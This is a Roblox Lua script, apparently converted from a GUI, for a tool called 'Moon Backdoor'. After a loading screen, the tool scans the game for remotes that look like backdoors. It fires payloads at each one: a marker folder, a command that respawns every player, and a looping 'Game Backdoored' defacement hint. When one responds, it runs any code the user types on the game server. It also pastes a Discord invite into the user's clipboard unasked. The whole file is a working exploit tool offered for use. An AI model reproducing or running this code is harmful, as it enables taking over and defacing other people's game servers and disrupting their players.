--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 31 | Scripts: 6 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.Load
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Load]];
G2L["2"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Load.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Load.bg
G2L["4"] = Instance.new("ImageLabel", G2L["2"]);
G2L["4"]["ZIndex"] = 10000000;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["4"]["Image"] = [[rbxassetid://992001116]];
G2L["4"]["Size"] = UDim2.new(1.41, 0, 1, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 0.4;
G2L["4"]["Name"] = [[bg]];
G2L["4"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.bg.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["4"]);



-- StarterGui.ScreenGui.Load.Logo
G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6"]["ZIndex"] = 10000000;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6"]["Image"] = [[rbxassetid://73958241564252]];
G2L["6"]["Size"] = UDim2.new(0, 109, 0, 133);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 0.4;
G2L["6"]["Name"] = [[Logo]];
G2L["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UIAspectRatioConstraint
G2L["8"] = Instance.new("UIAspectRatioConstraint", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UICorner
G2L["9"] = Instance.new("UICorner", G2L["6"]);
G2L["9"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.ScreenGui.Main
G2L["a"] = Instance.new("Frame", G2L["1"]);
G2L["a"]["Visible"] = false;
G2L["a"]["ZIndex"] = 1000000000;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["a"]["Size"] = UDim2.new(0, 472, 0, 312);
G2L["a"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.UIDrag
G2L["b"] = Instance.new("LocalScript", G2L["a"]);
G2L["b"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["c"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Main.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Main.bg
G2L["e"] = Instance.new("ImageLabel", G2L["a"]);
G2L["e"]["ZIndex"] = 1000000000;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["e"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["e"]["Image"] = [[rbxassetid://992001116]];
G2L["e"]["Size"] = UDim2.new(0, 471, 0, 312);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Name"] = [[bg]];


-- StarterGui.ScreenGui.Main.bg.UICorner
G2L["f"] = Instance.new("UICorner", G2L["e"]);
G2L["f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.CodeBar
G2L["10"] = Instance.new("TextBox", G2L["a"]);
G2L["10"]["Name"] = [[CodeBar]];
G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10"]["ZIndex"] = 1000000000;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextSize"] = 17;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(3, 3, 3);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["MultiLine"] = true;
G2L["10"]["ClearTextOnFocus"] = false;
G2L["10"]["PlaceholderText"] = [[print(" Moon Backdoor")]];
G2L["10"]["Size"] = UDim2.new(0, 431, 0, 202);
G2L["10"]["Position"] = UDim2.new(0.04237, 0, 0.14423, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[]];


-- StarterGui.ScreenGui.Main.CodeBar.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);
G2L["11"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons
G2L["12"] = Instance.new("Frame", G2L["a"]);
G2L["12"]["ZIndex"] = 1000000000;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Size"] = UDim2.new(0, 431, 0, 41);
G2L["12"]["Position"] = UDim2.new(0.04237, 0, 0.82051, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Name"] = [[Buttons]];
G2L["12"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Buttons.UIListLayout
G2L["13"] = Instance.new("UIListLayout", G2L["12"]);
G2L["13"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["13"]["Padding"] = UDim.new(0, 19);
G2L["13"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["13"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["13"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Buttons.Exe
G2L["14"] = Instance.new("TextButton", G2L["12"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 29;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["ZIndex"] = 1000000000;
G2L["14"]["Size"] = UDim2.new(0, 205, 0, 38);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Execute]];
G2L["14"]["Name"] = [[Exe]];
G2L["14"]["Position"] = UDim2.new(0.2181, 0, -0.0122, 0);


-- StarterGui.ScreenGui.Main.Buttons.Exe.UICorner
G2L["15"] = Instance.new("UICorner", G2L["14"]);
G2L["15"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons.Clear
G2L["16"] = Instance.new("TextButton", G2L["12"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 29;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["ZIndex"] = 1000000000;
G2L["16"]["Size"] = UDim2.new(0, 205, 0, 38);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[clear]];
G2L["16"]["Name"] = [[Clear]];
G2L["16"]["Position"] = UDim2.new(0.2181, 0, -0.0122, 0);


-- StarterGui.ScreenGui.Main.Buttons.Clear.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);
G2L["17"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Name
G2L["18"] = Instance.new("TextLabel", G2L["a"]);
G2L["18"]["ZIndex"] = 1000000000;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 36;
G2L["18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Moon Backdoor]];
G2L["18"]["Name"] = [[Name]];
G2L["18"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Logo
G2L["19"] = Instance.new("ImageLabel", G2L["a"]);
G2L["19"]["ZIndex"] = 1000000000;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["19"]["Image"] = [[rbxassetid://73958241564252]];
G2L["19"]["Size"] = UDim2.new(0, 33, 0, 38);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Name"] = [[Logo]];
G2L["19"]["Position"] = UDim2.new(0.04237, 0, 0.02564, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["1a"] = Instance.new("UIAspectRatioConstraint", G2L["19"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["1b"] = Instance.new("TextLabel", G2L["a"]);
G2L["1b"]["ZIndex"] = 1000000000;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextSize"] = 20;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[🔴]];
G2L["1b"]["Name"] = [[Stats]];
G2L["1b"]["Position"] = UDim2.new(0.89407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["1c"] = Instance.new("UIAspectRatioConstraint", G2L["1b"]);



-- StarterGui.ScreenGui.Main.Connect
G2L["1d"] = Instance.new("TextButton", G2L["a"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 20;
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["ZIndex"] = 1000000000;
G2L["1d"]["Size"] = UDim2.new(0, 98, 0.01, 22);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[Connect]];
G2L["1d"]["Name"] = [[Connect]];
G2L["1d"]["Position"] = UDim2.new(0.68522, 0, 0.0387, 0);


-- StarterGui.ScreenGui.Main.Connect.UICorner
G2L["1e"] = Instance.new("UICorner", G2L["1d"]);
G2L["1e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.UICorner
G2L["1f"] = Instance.new("UICorner", G2L["a"]);
G2L["1f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Load.LocalScript
local function C_3()
local script = G2L["3"];
	wait(5)
	
	local ok = script.Parent.Logo
	local oas = script.Parent.bg
	
	local function fade(obj, time)
		for i = 0.4, 1, 0.05 do
			obj.BackgroundTransparency = i
			obj.ImageTransparency = i
			wait(time)
		end
	end
	
	fade(ok, 0.05)
	fade(oas, 0.05)
	
	wait(0.05)
	script.Parent.Visible = false
	script.Parent.Parent.Main.Visible = true
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Load.bg.LocalScript
local function C_5()
local script = G2L["5"];
	local UI_ELEMENT = script.Parent 
	local START_POSITION = UDim2.new(0.34, 0, 0.5, 0)
	local END_POSITION = UDim2.new(0.58, 0, 0.5, 0)
	local TWEEN_DURATION = 1.0
	local EASING_STYLE = Enum.EasingStyle.Sine 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 
	
	local tweenInfo = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		-1,
		true, 
		0 
	)
	
	
	local tween = game:GetService("TweenService"):Create(UI_ELEMENT, tweenInfo, {Position = END_POSITION})
	
	tween:Play()
	
end;
task.spawn(C_5);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_7()
local script = G2L["7"];
	local IMAGE_LOGO = script.Parent
	
	
	local ROTATION_ANGLE_1 = -5 
	local ROTATION_ANGLE_2 = 9  
	
	
	local TWEEN_DURATION = 1.0 
	local EASING_STYLE = Enum.EasingStyle.Quad 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 
	
	local tweenInfo1 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0 
	)
	
	local tweenInfo2 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0
	)
	
	
	local function startRotationLoop()
		while true do
			local tween1 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo1,
				{Rotation = ROTATION_ANGLE_1}
			)
			tween1:Play()
			tween1.Completed:Wait()
	
			local tween2 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo2,
				{Rotation = ROTATION_ANGLE_2}
			)
			tween2:Play()
			tween2.Completed:Wait() 
		end
	end
	
	
	startRotationLoop()
end;
task.spawn(C_7);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_b()
local script = G2L["b"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_c()
local script = G2L["c"];
	game.StarterGui:SetCore("SendNotification", {
		Title = "Moon",
		Text = "Please Join Our Server.",
		Icon = "rbxassetid://7395824155",
		Duration = 10,
	})
	
	setclipboard("https://discord.gg/W5bNxXf85r")
end;
task.spawn(C_c);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_d()
local script = G2L["d"];
	local buttons = {
		Exe = script.Parent.Buttons.Exe;
		clear = script.Parent.Buttons.Clear;
		connect = script.Parent.Connect;
	}
	
	local statustext = script.Parent.Stats
	local codeBar = script.Parent.CodeBar
	
	local statusIcons = {
		Offline = "🔴";
		Checking = "🟠";
		Allow = "🟢";
	}
	
	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end
	
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}
	
	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end
	
		if EXCLUDED_REMOTES[remote.Name] then return false end
	
		return true
	end
	
	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()
	
	local function testRemote(remote, isFunction)
		if foundExploit then return false end
	
		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)
	
		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}
	
		local RE = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]
		
		
		
		
		
		
	
		
		local Hint = [[
		local hint = Instance.new("Hint", game.Workspace)
		hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		
		while true do
			wait(5)
			hint:Destroy()
			wait(5)
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		end
		]]
		
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
			end
		end)
	
		return testId
	end
	
	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()
	
		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))
	
		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end
	
			local timeoutDuration = 0.5
			local checkInterval = 0.05
			local elapsed = 0
	
			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval
	
				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]
	
					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart -- Calculate time to find
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end
	
		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end
	
		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	
	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				StarterGui:SetCore("SendNotification", {
					Title = "Moon",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end
	
	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://7395824155",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("🌙 moon: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))
	
			if foundExploit then
				setStatus("B")
				local formattedTime = string.format("%.2f", timeToFindExploit)
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				setStatus("O")
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)
	
	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)
	
	setStatus("O")
	updateExeButton()
end;
task.spawn(C_d);

return G2L["1"], require;
